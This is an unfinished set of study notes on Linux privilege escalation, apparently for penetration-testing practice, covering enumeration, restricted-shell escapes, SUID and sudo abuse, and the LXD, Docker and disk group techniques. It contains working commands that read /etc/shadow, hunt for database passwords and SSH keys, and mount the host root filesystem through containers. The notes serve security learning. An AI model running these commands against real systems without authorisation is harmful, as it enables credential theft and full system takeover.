# Linux Privilege Escalation

## Environment Enumeration

```shell
# Current user
whoami
# Current user id
id
# Server name
hostname
# Kernal info
cat /etc/os-release
uname -a
# PATH variable
echo $PATH
# env variables
env
# CPU info
lscpu
# Available shells
cat /etc/shells

# Mounted drives and unmounted drives
cat /etc/fstab
df -h
at /etc/fstab | grep -v "#" | column -t # unmounted
# block devices on the system (hard disks, USB drives, optical drives, etc.)
lsblk
# Printers info
lpstat
# Network info
ifconfig
route
netstat -rn
arp -a
ip a
cat /etc/hosts
```

```shell
# Commands user can run with sudo
sudo -l
# Existing users on device
cat /etc/passwd | cut -f1 -d:
# Users with login shells
grep "*sh$" /etc/passwd
# Existing groups
cat /etc/group
# Group members
getent group <group name>
```

```shell
# Home directories
ls /home

# Hidden files and directories
find / -type f -name ".*" -exec ls -l {} \; 2>/dev/null | grep $USER
find / -type d -name ".*" -ls 2>/dev/null
# Configuration files
find / -type f \( -name *.conf -o -name *.config \) -exec ls -l {} \; 2>/dev/null
# Scripts
find / -type f -name "*.sh" 2>/dev/null | grep -v "src\|snap\|share"

# History
history
# History files
find / -type f \( -name *_hist -o -name *_history \) -exec ls -l {} \; 2>/dev/null
```

```shell
# User's last login
lastlog
# Logged in users
w
# Services running by a user
ps aux | grep $USER
```

```shell
# Cronjobs
ls -la /etc/cron.daily/

# Proc filesystem
# The proc filesystem (proc / procfs) is a particular filesystem in
# Linux that contains information about system processes, hardware,
# and other system information. It is the primary way to access process
# information and can be used to view and modify kernel settings. It is
# virtual and does not exist as a real filesystem but is dynamically 
# generated by the kernel. 
find /proc -name cmdline -exec cat {} \; 2>/dev/null | tr " " "\n"

# Installed packages and binaries
apt list --installed | tr "/" " " | cut -d" " -f1,3 | sed 's/[0-9]://g' | tee -a installed_pkgs.list
ls -l /bin /usr/bin/ /usr/sbin/

# Sudo version
sudo -V
```

- `GTFObins` is a platform that includes a list of binaries that can potentially be
exploited to escalate our privileges on the target system.

```shell
for i in $(curl -s https://gtfobins.github.io/ | html2text | cut -d" " -f1 | sed '/^[[:space:]]*$/d');do if grep -q "$i" installed_pkgs.list;then echo "Check GTFO for: $i";fi;done
```

- We can use `strace` to track and analyze system calls and signal processing.

```shell
strace <command>
strace ping -c1 10.129.112.20
```

## Credential Hunting

```shell
cat wp-config.php | grep 'DB_USER\|DB_PASSWORD'
find / ! -path "*/proc/*" -iname "*config*" -type f 2>/dev/null
ls ~/.ssh
ls /home/*/.ssh
```

## Wildcard and PATH Abuse

- Wildcard and path abuse techniques exploit misconfigurations in file handling, especially
 in automated scripts.  
- Wildcard Abuse: Leverages `*` or `?` in shell commands (e.g., `rm *`) to inject malicious files
 like `--exec` or `-rf` for command execution.  
- Path Abuse: Manipulates the `PATH` environment variable to execute malicious binaries instead of
 legitimate system commands.  
- Both techniques can escalate privileges or achieve code execution if proper sanitization is missing.

## Escaping Restricted Shells

- A restricted shell is a type of shell that limits the user's ability to execute commands.
- Examples: `rbash`, `rksh`, `rzsh`
- Following are methods to escape these shells:

```shell
# Command injection
ls -l `pwd`
# Command substitution
echo `id`
echo $(whoami)
# Command Chaining
echo Hi;id
echo Hi | id
```
- If shell uses `env` variable to specify the directory in which commands are executed,
it may be possible to escape from the shell by modifying the value of the environment 
variable to specify a different directory.
- Define and call shell functions that execute commands not restricted by the shell.

## Special Permissions

- The `Set User ID upon Execution (setuid)` permission can allow a user to execute a program
or script with the permissions of another user, typically with elevated privileges.
- The setuid bit appears as an `s`.
- The `Set-Group-ID (setgid)` permission is another special permission that allows us to run
binaries as if we were part of the group that created them.

```shell
# List files with setuid bit
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null
# List files with setgid bit
find / -user root -perm -6000 -exec ls -ldb {} \; 2>/dev/null
```

- Find payloads here: [GTFObins](https://gtfobins.github.io/)


## Sudo Rights Abuse

- Sudo privileges can be granted to an account, permitting the account to run certain commands
in the context of the root (or another account) without having to change users or grant excessive
privileges.
- Any rights entries with the `NOPASSWD` option can be seen without entering a password.

```shell
sudo -l
```

- Find payloads here: [GTFObins](https://gtfobins.github.io/)


## Privileged Groups

### LXD

- `LXD` is Ubuntu's container manager. Upon installation, all users are added to the LXD group.
- Membership of this group can be used to escalate privileges by creating an LXD container, 
making it privileged, and then accessing the host file system at `/mnt/root`.

```shell
# Get alpine image an unzip it
unzip alpine.zip 
# Start the LXD initialization process
lxd init
# Import the local image
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine
# Start a privileged container with the security.privileged set to true
lxc init alpine r00t -c security.privileged=true
# Mount the host file system
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true
# Start the container
lxc start r00t
# Spawn shell inside container
lxc exec r00t /bin/sh
```

### Docker

- Placing a user in the docker group is essentially equivalent to root level access to
the file system without requiring a password.
- Members of the docker group can spawn new docker containers.

```shell
docker run -v /root:/mnt -it ubuntu
```

- Once the container is started we are able to browse the mounted directory and retrieve
or add SSH keys for the root user or read `/etc/shadow` file.

### Disk

- Users within the disk group have full access to any devices contained within `/dev`, such as
`/dev/sda1`, which is typically the main device used by the operating system.
- An attacker with these privileges can use `debugfs` to access the entire file system with root
level privileges.

```shell
# Verify disk access
ls -l /dev/sda1
# Launch debugfs
sudo debugfs /dev/sda1
# Read sensitive files
debugfs: cat /etc/shadow
```

### ADM

- Members of the adm group are able to read all logs stored in `/var/log`.
- This does not directly grant root access, but could be leveraged to gather sensitive data 
stored in log files or enumerate user actions and running cron jobs.


## Capabilities

- Linux capabilities are a security feature in the Linux operating system that allows specific
privileges to be granted to processes, allowing them to perform specific actions that would otherwise 
be restricted.
- This allows for more fine-grained control over which processes have access to certain privileges, 
making it more secure than the traditional Unix model of granting privileges to users and groups.

to be continued ...